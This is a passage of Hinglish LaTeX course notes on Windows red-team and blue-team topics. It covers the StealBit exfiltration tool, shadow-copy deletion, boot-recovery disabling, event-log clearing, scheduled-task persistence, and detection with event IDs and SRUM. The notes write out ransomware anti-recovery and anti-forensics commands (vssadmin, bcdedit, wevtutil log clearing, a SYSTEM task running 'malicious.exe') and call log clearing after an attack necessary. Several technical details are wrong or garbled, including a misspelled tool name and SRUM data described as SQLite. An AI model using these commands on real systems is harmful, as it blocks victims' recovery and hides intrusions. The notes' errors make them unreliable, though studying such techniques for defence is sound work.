      \end{enumerate}
      ...
      \lstset{
        ...
        commentstyle=\color{green},
        morecomment=[l][\color{magenta}]{\#},
        morekeywords={vssadmin,bcdedit,shutdown},
        breaklines=true,
        frame=none
      }
      ...
      \textcolor{blue}{\huge\bfseries Topic--StealBit Exfiltration Tool}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} StealBit ek \textbf{data exfiltration malware/tool} hai jo cyber threat groups (jaise LockBit ransomware gang) ke dwara use hota hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Yeh tool specifically design kiya gaya hai \textbf{sensitive files (confidential data) ko chori karne aur remote server ya cloud storage pe bhejne ke liye}.
        \item \textbf{Note:} \textcolor{red}{Note:} Ye categorized data ko identify karta hai, files ko encrypt karke safe upload karta hai, aur stealthy network communication maintain karta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Real-world ransomware gangs aur advanced attackers jaise LockBit ne isko develop kiya hai, isliye red teamers ise adopt kar ke \textbf{true attacker ki tarah simulate} karte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Isse unhe pata chalta hai ki \textbf{real attackers kaise data exfiltration karte hain}, aur blue team ki detection capabilities kaise test karni hai.
        \item StealBit ke features hain:
          \begin{itemize}
            \item Automated file discovery \& categorization
            \item Scheduled exfiltration
            \item AES-256 encryption
            \item Cloud storage integration (e.g., OneDrive)
          \end{itemize}
        \item Target machine ya network pe access le lo (phishing, exploit, etc.).
        \item Payload ko drop karo, usually stealthy tarike se (disable AV alerts etc.).
        \item Config file me specify karo kaunse file paths ya types exfiltrate karne hain (e.g., docs, spreadsheets, credentials).
        \item Tool background me chaloo hai, data discover karta hai, encrypt karta hai, and attacker ke remote cloud storage ya server par upload karta hai.
        \item Traffic ko encrypt karta hai, known trusted domains se connect karta hai.
        \item Logs aur alerts clear karta hai regularly.
        \item \textbf{Note:} \textcolor{red}{Note:} StealBit jaise tools intel dete hain ki attackers \textbf{kaise automation se data churaate hain}.
        \item Detection ke liye focus karo:
          \begin{itemize}
            \item Network traffic anomalies, especially towards cloud storage.
            \item File access patterns aur scheduled tasks/processes monitoring.
            \item Endpoint detection for suspicious encryption activity.
          \end{itemize}
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{Feature} & \textbf{Description} & \textbf{Red Team Use} \\
        \hline
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, iska pura scene yehi hai — real ransomware groups jaise LockBit is tool se apna asli treasure churaate hain. Red teamers ise exploit kar ke apne network ke defenses test karte hain, blue team ki readiness probe karte hain.
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--Shadow Copies aur Unko Delete Karna}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Shadow Copy (Volume Shadow Copy Service - VSS) Windows ka ek feature hai jo disk ke snapshots leti hai — poore file system ya kisi volume ka image banati hai time ke kisi specific point par.
        \item \textbf{Note:} \textcolor{red}{Note:} Yeh snapshots restore points aur backup mein use hote hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Malware/attack ke baad system ko restore karne ke liye ya accidentally deleted files ko wapas laane ke liye helpful hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Red team perspective mein shadow copies \textbf{backup like mechanism hain jo blue team ke liye recovery aur forensics ka aur attack ko rokne ka zariya hain}.
        \item \textbf{Note:} \textcolor{red}{Note:} Red team offensive operation mein agar persistence ya ransomware deploy kar raha ho, toh shadow copies ko \textbf{delete karna hota hai} taaki blue team \textbf{backup se restore na kar paye}.
        \item Is se attacker ka impact bada hota hai (availability attack, persistence breaking, recovery ko difficult banana).
        \item \textbf{Note:} \textcolor{red}{Note:} \texttt{vssadmin} ek Windows ka native command-line tool hai jo VSS (Volume Shadow Copy Service) ko manage karta hai.
        \item Is se tum shadow copies dekh sakte ho, bana sakte ho, delete kar sakte ho, aur VSS related tasks perform kar sakte ho.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
vssadmin delete shadows /all /quiet
\end{lstlisting}
          \end{tcolorbox}
          \begin{itemize}
            \item \texttt{delete shadows}: Existing shadow copies ko delete karne ke liye.
            \item \texttt{/all}: Saare shadow copies remove karne ke liye.
            \item \texttt{/quiet}: Confirmation prompt ko skip karne ke liye (silent deletion).
          \end{itemize}
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          Yeh command tumhe system ke saare available shadow snapshots dikhata hai.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
vssadmin delete shadows /all /quiet
...
\end{lstlisting}
        ...
        \item \textbf{Note:} \textcolor{red}{Note:} Restore points remove kar ke recovery block karne ke liye (especially ransomware attacks).
        \item \textbf{Note:} \textcolor{red}{Note:} Forensics aur IR ko difficult banane ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} System ko attacker ke control mein freeze karne ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} Blue team ka fallback option remove karne ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} Windows event logs mein vssadmin commands ke execution ke logs mil jaate hain (Event ID 7045, 4656).
        \item \textbf{Note:} \textcolor{red}{Note:} Shadow copy deletion abnormal hai — alert banaya ja sakta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Endpoint Detection tools (EDR) vssadmin usage ko block ya alert kar dete hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Defensive practice: frequent shadow copy monitoring aur backup policy enforcement.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{Step} & \textbf{Command} & \textbf{Purpose} \\
        \hline
        List Shadow Copies & \texttt{vssadmin list shadows} & Existing snapshots dekho \\
        Delete All Copies & \texttt{vssadmin delete shadows /all /quiet} & Sab snapshots bina prompt ke delete karo \\
        Confirm Deletion & \texttt{vssadmin list shadows} & Pata karo deletion successfully hui \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, yeh poori story hai \textbf{shadow copies ka aur unke cleanup ka} red team view se, taaki attacker apni trail chhupa ke poora impact de. Lab me try kar, aur koi bhi doubts ho toh ping kar.
        \item Stay alert, stay dangerous! ��
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--Modifying Boot Status Policies}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Boot status policies Windows system ke startup behavior ko control karti hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Ye policies define karti hain ki agar boot ke dauran error aaye (jaise failed startup, crash), toh system kya kare:
          \begin{itemize}
            \item Recovery modes enable kare ya disable kare
            \item Automatic repair attempts kare ya ignore kare.
          \end{itemize}
        \item Yeh settings system ki reliability aur recovery process ko maintain karne mein help karti hain.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          \begin{itemize}
            \item \texttt{\{default\}} controller hai current default boot entry ka.
            \item \texttt{bootstatuspolicy ignoreallfailures} set karta hai ki agar system boot errors aaye, toh unhe ignore karo, aur recovery screen na dikhao.
            \item Iska matlab hai system \textbf{koi repair attempt nahi karega}, directly normally boot karega chaahe errors ho.
          \end{itemize}
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          \begin{itemize}
            \item Ye command Windows automatic recovery ko disable karta hai.
            \item Agar system crash ya boot failure hota hai, tab bhi recovery environment activate nahi hoga.
            \item System bina recovery prompt ke boot karega.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Purpose:}
          \begin{itemize}
            \item Red team attack chain mein persistence rehta hai, lekin agar system reboot ho jata hai toh recovery options ya repair attempt se payload ya malware hat sakta hai.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Isliye, Boot Status Policies modify karke:}
          \begin{itemize}
            \item System ko forced boot banate hain bina recovery options ke.
            \item Malware ya backdoor survive karta hai restart ke baad bhi, bina kisi repair ke.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Use Cases:}
          \begin{itemize}
            \item Ransomware deployment ke baad damaging recovery ko rokna.
            \item Persistence maintain karna advanced evasion ke liye.
          \end{itemize}
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
        \item Taaki naye boot options effect ho.
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
shutdown /r /t 0
\end{lstlisting}
          \end{tcolorbox}
        \item \textbf{Note:} \textcolor{red}{Note:} Boot configuration changes ke logs (Event ID 1001) ko monitor karo.
        \item \textbf{Note:} \textcolor{red}{Note:} Unauthorized use of BCDEdit commands alert karo.
        \item \textbf{Note:} \textcolor{red}{Note:} System recovery options disable hona suspicious hai, alerting ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} Endpoint security policies se BCDEdit command restrictions lagao.
      \end{enumerate}

      \begin{longtable}{|p{6cm}|p{4cm}|p{4cm}|}
        \hline
        \textbf{Command} & \textbf{Purpose} & \textbf{Red Team Use} \\
        \hline
        \texttt{bcdedit /set \{default\} bootstatuspolicy ignoreallfailures} & Boot errors ignore karna & Recovery disable kar evasion \\
        \texttt{bcdedit /set \{default\} recoveryenabled no} & Automatic recovery disable karna & Malware persistence badaata hai \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, yeh tha tera \textbf{Boot Status Policies modification ka practical overview} red team point of view se. Practice kar, samajh ja, aur agar aur koi sawal ho to bata dena.
        \item Stay lethal, stay learning! ��
      \end{enumerate}
      ...
      \textcolor{blue}{\huge\bfseries Topic--Event Logs Delete Karna using wevutil.exe}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Windows Event Logs system activities, errors, warnings, security events, application events ke record hote hain.
        \item Inmein user logins, process creations, system errors, antivirus alerts, firewall changes, service start/stop jaise kai important info stored hoti hai.
        \item Teen main categories hain:
          \begin{itemize}
            \item \textbf{System log:} OS and hardware related events.
            \item \textbf{Security log:} Audit logs including login, logout, privilege use.
            \item \textbf{Application log:} Installed applications ke events.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{wevutil.exe} Windows ka native command line tool hai jo Windows Event Logs manage karta hai.
        \item Isse logs ko clear karna, export karna, info retrieve karna possible hota hai.
        \item Useful in automated scripts aur penetration testing to clear footprints.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
          \begin{itemize}
            \item \texttt{cl} matlab \textbf{clear} logs.
            \item \texttt{system}: System event logs clear honge.
            \item \texttt{security}: Security audit logs clear karoge (login attempts, failed logins).
            \item \texttt{application}: Application specific logs remove karoge.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} Post exploitation mein jab unhone koi malicious activity ki, to \textbf{footprint chhupane ke liye logs clear karte hain}.
        \item Agar logs clear nahi kiya toh blue team forensic analyst logs ke through suspicious activities trace kar sakte hain (jaise unusual login times, new service creation, file access).
        \item Logs clear karne se attacker ki presence detect hone ka chance kam ho jata hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Logs mein unke malicious actions record honge.
        \item Blue team un logs ko analyze karke attacker ki activities pata kar sakti hai.
        \item Detection and response team incident detect kar sakti hai.
        \item Potentially attacker block ya remove ho jaayega.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{8cm}|}
        \hline
        \textbf{Log Type} & \textbf{Stored Information} \\
        \hline
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item Event Viewer GUI tool se access kar sakte hain (\texttt{eventvwr.msc}).
        \item Logs usually timestamp, event ID, severity (Error, Warning, Info), source, and detail ke form me present hote hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Attack ke baad \textbf{event logs ko clear karna zaruri} hai taaki trace kam ho.
        \item \texttt{wevutil.exe cl} commands efficient aur silent method hai.
        \item Agar nahi kiya, ta forensic evidence fail ho sakta hai.
        \item Logs edit karna ya tamper karna risky hai—clear karna better hota hai.
      \end{enumerate}
      ...
      \begin{longtable}{|p{5cm}|p{3cm}|p{5cm}|}
        ...
        \textbf{Command} & \textbf{Purpose} & \textbf{Red Team Use Case} \\
        \hline
        \texttt{wevutil.exe cl system} & Clear system logs & Remove OS event traces \\
        \texttt{wevutil.exe cl security} & Clear security logs & Remove login and audit traces \\
        \texttt{wevutil.exe cl application} & Clear application logs & Remove app-specific event traces \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, yeh tha tera complete \textbf{event logs deletion ka funda using wevutil.exe}, red team point of view se. Practice in controlled lab, aur agar aur details chahiye toh bolio.
        \item Stay stealthy, stay lethal! ��
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--Incident Response (IR) Plan for Ransomware Attack}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Ransomware ek malicious software hai jo system ke files ko encrypt kar deta hai aur ransom demand karta hai un files ko unlock karne ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} Attack chain mein ransomware payload delivery se lekar encryption tak ka process hota hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Red team ko IR plan samajhna chahiye taaki woh apne attack ko stealthy aur impact full bana sake, blue team ki defense evade kar sake.
        \item Sabse pehla kaam hota hai \textbf{infected machine ko network se isolate karna} taaki ransomware aage spread na ho.
        \item Network switch se port disable karna ya VLAN se isolate karna.
        \item Logs aur alerts ke zariye pata lagao kaun kaun machines affected hain.
        \item Honeypot, EDR logs, firewall logs use karke infected machines trace karna.
        \item Ransomware ke C2 (command and control) servers ke IP addresses find karo.
        \item Firewall mein un IPs ko block karo taaki communication kat jaye.
        \item Malware ke executable hashes find karke endpoint security me block karo.
        \item Antivirus, EDR rules update karo taaki ye malware dobara na aaye.
        \item Threat actor remote management ke liye AnyDesk, TeamViewer jese tools use karte hain.
        \item Un tools ke \textbf{creation time, installation time} logs check karo.
        \item Unko block kar do ya uninstall kar do taaki koi remote access na rahe.
        \item Scheduled tasks, registry run keys, services, WMI persistence sab identify kar ke delete karo.
        \item Persistence removal malware clean karne mein critical hai.
        \item Active ransomware/process analysis karo.
        \item Suspicious C2 communication process ko terminate karo.
        \item Network traffic monitor karke C2 connection close karo.
        \item Backup se data restore karo.
        \item Patch vulnerabilities.
        \item Passwords change karo.
        \item Security policies aur user awareness training improve karo.
        \item \textbf{Note:} \textcolor{red}{Note:} Red team attackers apna footprint minimize karne ke liye inhi steps ka counter sochte hain.
        \item Persistence hide karte hain, forensic artifacts clean karte hain.
        \item Backup disable kar dete hain, defensive tools disable karte hain.
        \item Remote tools Eclipse karte hain ya custom tools use karte hain jo detection kam hain.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{IR Step} & \textbf{Action} & \textbf{Red Team Countermeasure} \\
        \hline
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, ye tera \textbf{ransomware attack IR plan} ka detailed walkthrough tha, red team awareness ke sath. Lab mein simulate kar, apne process setup kar, aur koi questions ho toh batana!
        \item Stay smart, stay safe! ��
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--Blue Team Operation Investigation using Windows Event Logs}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{EventLogXP.com} ek popular website hai jo \textbf{Windows Event Log analysis, tools aur resources provide karta hai}.
        \item Yaha pe specialized software milta hai jo Windows Event Logs ko easily read, search, filter aur analyze karne mein madad karta hai.
        \item Yeh site blue teams, system admins, aur forensic investigators ke liye badi useful hai to speed up investigations.
        \item \textbf{Note:} \textcolor{red}{Note:} EventLogXP ke software (jaise Event Log Explorer, Event Viewer tools) Windows event logs ko efficiently open,parse aur analyze karta hai.
        \item Is software ka use karke tu logs me se spying, suspicious auth events, lateral movement detect kar sakta hai bina complex command line ke.
        \item Efficient GUI ke zariye filtering and searching fast hoti hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Windows logs default path pe store hote hain:
          \begin{tcolorbox}[title=Path]
\begin{lstlisting}
C:\Windows\System32\winevt\Logs\
\end{lstlisting}
          \end{tcolorbox}
          Is folder me logs \texttt{.evtx} extension ke hote hain.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{4cm}|p{5cm}|}
        \hline
        \textbf{Log Type} & \textbf{File Name} & \textbf{Content} \\
        \hline
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{4624}: Successful Account Logon event (kab kisi ne login kiya).
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{4625}: Failed Account Logon event (kab login attempt fail hua).
        \item Ye dono logs \textbf{security auditing ke liye} bahut important hain lateral movement, brute force attack ya suspicious login detection ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} Event 4624/4625 ki details me \textbf{Network Information} section hota hai.
        \item "Source Network Address" field me attacker/client ka IP address hota hai.
        \item Use Windows Event Viewer GUI ya Event Log software me filter kar ke dekh sakte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Event Viewer me:
          \begin{enumerate}
            \item Open karo Event Viewer (\texttt{eventvwr.msc}).
            \item Navigate karo \textbf{Windows Logs > Security}.
            \item Filter Current Log karo by Event ID (like 4624 ya 4625).
            \item Specific event select karo, details box me IP, username, process information dikhega.
          \end{enumerate}
        \item \textbf{Note:} \textcolor{red}{Note:} Event Numbers allow granularity aur specific activity tracking.
        \item Example: Monitor multiple failed logins (4625) for brute force.
        \item Event IDs help automated detection tools (SIEM) me rules banane me.
        \item \textbf{Note:} \textcolor{red}{Note:} IP address se pata chalta hai attacker ka source machine ya network.
        \item Event number se pata chalta hai kaunse tarike se login hua (success/fail).
        \item Analysis se logon attempts ke pattern samajh me aate hain.
        \item Blue team attack trace kar ke timely response karti hai.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{Topic} & \textbf{Description} & \textbf{Use Case} \\
        \hline
        EventLogXP.com & Website with event log analysis tools & Efficient log parsing and forensic analysis \\
        Windows Event Logs Location & \texttt{C:\textbackslash Windows\textbackslash System32\textbackslash winevt\textbackslash Logs\textbackslash} & Stores \texttt{.evtx} log files \\
        ...
        Finding IP & \texttt{Source Network Address} field in events & Trace attacker/source machine \\
        Using Event Numbers & Filter \& monitor specific events & Attack detection \& response \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, ab event logs ke importance, unka use, IP tracing aur event numbers samajh aa gaya. Lab mein practice kar Event Viewer se ya EventLogXP jaise tools ke zariye logs ko analyze karna start kar. Aur koi help chaiye toh bol dena!
        \item Stay vigilant, stay unbeatable! ��
      \end{enumerate}
      ...
      \textcolor{blue}{\huge\bfseries Topic--Windows Event IDs 7045 aur 7034}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Event ID 7045} system event log mein tab record hota hai jab \textbf{naya service install ya create kiya jata hai}.
        \item Is event mein service ka naam, executable path, service ke properties, aur user context ka detail hota hai.
        \item Security log mein yeh event ek important indicator hota hai kisi naye software ya malicious persistence mechanism ke installation ka.
        \item Service name (jo service bana)
        \item Service file path (jo executable hai)
        \item Service type aur startup mode
        \item User account jisne service banayi
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Event ID 7034} event tab generate hota hai jab \textbf{koi service unexpectedly stop ho jata hai}.
        \item Ye crash, fail ya manually termination ka indication ho sakta hai.
        \item Attack detection mein useful hota hai kyunki malware/service crashes ya failures ko track karta hai.
        \item Service name jo stop hua
        \item Stop reason (agar available ho)
        \item Timestamp
        \item \textbf{Note:} \textcolor{red}{Note:} Jab red teamers koi \textbf{malicious service deploy karte hain} for persistence, toh 7045 event create hota hai.
        \item Red teamers is knowledge ko use kar ke:
          \begin{itemize}
            \item Event ko minimize karne ya tamper karne ki koshish karte hain.
            \item Service ko temporary load/unload karte hain taaki footprint kam dikhe.
            \item Monitoring tools mein alerts trigger hone se bachne ke liye service creation randomize karte hain.
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} Agar red team ka service crash ya failure hata detection ke liye.
        \item Wo service ko restart scripts ke through auto-recover karwate hain ya crash logs clear karwate hain.
        \item Malicious services crash hone par ye event blue team analysis ke liye red flag hota hai.
        \item \textbf{Note:} \textcolor{red}{Note:} 7045 event se pata chalta hai system pe nayi service kab aur kaise create hui.
        \item Agar unfamiliar service create ho to malware ya attacker activity suspect hoti hai.
        \item 7034 event se pata chalta hai ki koi service unexpectedly band hui, uska analysis karna slow down ya crash ka reason dhoondhna.
        \item Event correlation: 7045 ke baad 7034 events suspicious activity indicate karte hain.
      \end{enumerate}

      \begin{longtable}{|p{2cm}|p{4cm}|p{4cm}|p{5cm}|}
        \hline
        \textbf{Event ID} & \textbf{Description} & \textbf{Contains} & \textbf{Red Team Use} \\
        \hline
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, ye hi puri kahani hai 7045 aur 7034 events ki — red team footprint banana aur blue team unhe detect karna dono ki perspective se. Lab environment me binary creation and monitoring karke aur deep samajhna.
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--Windows Scheduled Task Creation Events (Event ID 4698)}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Scheduled Task Windows ka ek system feature hai jo programs/scripts ko \textbf{automatic scheduled time par} chalata hai.
        \item Ye tasks har tarah ke work ke liye use hote hain—system maintenance, backups, updates, ya koi bhi repetitive processes.
        \item Scheduled tasks ko GUI (Task Scheduler) se ya command line se manage kiya ja sakta hai.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{4698} event tab generate hota hai jab \textbf{Windows pe koi naya scheduled task create hota hai}.
        \item Is event mein task ka naam, creator ka user account, aur task ke execute hone ki timing details hoti hain.
        \item Security monitoring ke liye ye ek \textbf{important alert} hai, kyunki malicious persistence ke liye attackers scheduled tasks create karte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} Red teamers scheduled tasks ko \textbf{persistence banane ke liye} use karte hain.
        \item Malware ya backdoor program ko har reboot ya specific time pe chalane ke liye schedule karte hain.
        \item Scheduled tasks ko manually ya scripts ke through create karte hain taaki unka entry event ID 4698 generate ho.
        \item Shell ya remote session mil gaya target pe.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
schtasks /create /tn "UpdaterTask" /tr "C:\Users\Public\malicious.exe" /sc onlogon /ru SYSTEM
\end{lstlisting}
          \end{tcolorbox}
          \begin{itemize}
            \item \texttt{tn} = task name
            \item \texttt{tr} = task run karne wali file
            \item \texttt{sc} = schedule trigger (yaha onlogon matlab har login pe)
            \item \texttt{ru} = run as SYSTEM
          \end{itemize}
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
...
\end{lstlisting}
          \end{tcolorbox}
        \item Task ab har user login pe ya scheduled time pe chalega.
        \item \textbf{Note:} \textcolor{red}{Note:} Event Viewer me Security logs me filter karo \textbf{Event ID 4698}.
        \item Malicious scheduled task create hone ka trace milta hai.
        \item User account jo task banata hai, task name, aur execution time sab aata hai.
        \item Agar unknown ya suspicious task create hua hai, toh usse turant investigate karna chahiye.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{Step} & \textbf{Command/Action} & \textbf{Explanation} \\
        \hline
        Task Creation & \texttt{schtasks /create ...} & Scheduled task create kare attacker \\
        Verify Task & \texttt{schtasks /query /tn <taskname>} & Task existence check karo \\
        Detect Creation & Event Viewer me filter by \textbf{4698} & Scheduled task creation identify karo \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, ye tha tera \textbf{scheduled task creation aur uske event monitoring} ka pura funda red team perspective se. Lab me create karke event check kar, phir aur deep jaana. Koi questions ho toh bol!
        \item Stay sharp and keep hacking! ��
      \end{enumerate}
      ...
      \textcolor{blue}{\huge\bfseries Topic--SMB aur RDP Activity Investigation}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} SMB ek network file sharing protocol hai jo Windows systems me files, printers, aur serial ports share karne ke liye use hota hai.
        \item Windows networks me SMB ke through hi remote system ke resources access karte hain.
        \item Attackers lateral movement ke liye SMB ka misuse karte hain jaise file dumping, remote execution, brute force attempts.
        \item \textbf{Note:} \textcolor{red}{Note:} RDP Windows ka native protocol hai jiski madad se remote computer ka desktop control kar sakte hain.
        \item System administrators aur red teamers isse remote administration aur lateral movement ke liye use karte hain.
        \item RDP connections ke logs network aur endpoint pe tracking me important hoti hain.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Event Logs:}
          \begin{itemize}
            \item Security log me SMB related authentication entries dekhni chaiye. Particularly Event ID:
              \begin{itemize}
                \item \textbf{4624:} Successful login (SMB session bhi)
                \item \textbf{4625:} Failed login attempts
                \item \textbf{5140:} Network share object accessed
              \end{itemize}
            \item System log me SMB driver errors bhi track kar sakte hain.
          \end{itemize}
        \item \textbf{Steps:}
          \begin{enumerate}
            \item Event Viewer kholo > Security logs.
            \item Filter karo event IDs 4624, 4625, 5140.
            \item Details me “Network Information” aur “Object Name” (share ka path) dekho.
            \item Malicious or unexpected access patterns identify karo.
          \end{enumerate}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Event Logs:}
          \begin{itemize}
            \item \textbf{4624} (Successful logon) aur \textbf{4625} (Failed logon) events monitor karo.
            \item Winlogon logs me \textbf{Event ID 1149} (Remote Desktop Services: User authentication succeeded) bhi check karo.
            \item Event details me "Logon Type" 10 matlab RDP session hai.
          \end{itemize}
        \item \textbf{Steps:}
          \begin{enumerate}
            \item Event Viewer > Security logs open karo.
            \item Filter karo Event ID 4624 aur look for Logon Type 10.
            \item Source IP aur username details analyze karo.
            \item Failed login attempts (4625) bhi suspicious ho sakte hain.
          \end{enumerate}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Lateral Movement:} SMB ke through file transfer, commands run karte hain, credentials dump karte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Remote Access:} RDP se remote shell le kar system control karte hain.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Evading Detection:} Legitimate SMB aur RDP traffic me blend hote hain to stealth banti hai.
        \item \textbf{Note:} \textcolor{red}{Note:} SMB aur RDP ke logs ko centralized SIEM me feed karo.
        \item Suspicious logins and share accesses pe alert configure karo.
        \item VPN, firewall traffic monitor karke unauthorized external RDP connection detect karna.
        \item Multi-factor authentication (MFA) lagao RDP pe.
      \end{enumerate}

      \begin{longtable}{|p{3cm}|p{4cm}|p{4cm}|p{4cm}|}
        \hline
        \textbf{Protocol} & \textbf{Log/Event ID} & \textbf{What to Monitor} & \textbf{Red Team Use} \\
        \hline
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, ye thi teri \textbf{SMB aur RDP activity ki investigation ki puri kahani}, dono team ke nazariye se. Lab me practice kar aur event logs ko achhe se samajh. Kuch doubt ho toh push dena!
        \item Keep learning, keep hustling! ��
      \end{enumerate}
      ...
      \textcolor{blue}{\huge\bfseries Topic--SRUM Data}

      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{SRUM} ka full form hai \textbf{System Resource Usage Monitor}.
        \item Windows ka ek internal mechanism jo system aur apps ke resource usage (network, CPU, battery) ko monitor karta hai.
        \item SRUM detailed historical data store karta hai, jaise apps ne network kitna use kiya, kab kaha pe active rahe, etc.
        \item Ye data investigation aur forensic analysis ke liye bahut valuable hota hai system ke behavior ko samajhne ke liye.
        \item SRUM ki files Windows filesystem me yeh location par hoti hain:
          \begin{tcolorbox}[title=Path]
\begin{lstlisting}
C:\Windows\System32\sru\
\end{lstlisting}
          \end{tcolorbox}
        \item Is folder me files \textbf{SRUDB.dat} ke roop me hoti hain jo SQLite database format me resource usage data rakhti hain.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{SRUMECMD} ek command-line tool hai jo \textbf{SRUM database} ko parse karta hai aur human readable format me report generate karta hai.
        \item Red and blue teamers ise use karte hain to:
          \begin{itemize}
            \item Network usage traces identify karna by processes
            \item Apps ka usage monitor karna
            \item Timeline based analysis karna suspicious behavior track karne ke liye
          \end{itemize}
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{Timeline Explorer} ek forensic tool hai jo system activities ka detailed timeline banata hai.
        \item SRUM data ko visual aur searchable timeline form me convert karta hai.
        \item Investigators ke liye bahut useful hota hai attacker ke system pe hone wale events ko samajhne ke liye, jaise user logins, app launches, network usage spikes.
        \item \textbf{Red Team:}
          \begin{itemize}
            \item Apne activities ke footprints samajhna, detect hone se bachna.
            \item Apps ke network usage ko minimize karna ya disguise karna.
          \end{itemize}
        \item \textbf{Blue Team:}
          \begin{itemize}
            \item Malware ya suspicious app ke network usage aur resource use ko trace karna.
            \item User aur system ke behavioral pattern analysis karke attack spotting.
          \end{itemize}
      \end{enumerate}
      ...
      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        ...
        Storage Location & \texttt{C:\textbackslash Windows\textbackslash System32\textbackslash sru\textbackslash SRUDB.dat} & System databases with usage info \\
      ...
      \begin{enumerate}[itemsep=1em, resume]
        \item Bro ye tha tera \textbf{SRUM data and related tools ka pura funda} — system resource usage monitoring se forensic investigation tak. Lab me SRUMECMD try kar aur Timeline Explorer explore kar. Agar aur depth mein chahiye toh bol dedena!
        \item Stay sharp, stay learning! ��
      \end{enumerate}

      \textcolor{blue}{\huge\bfseries Topic--Browser History Investigation}

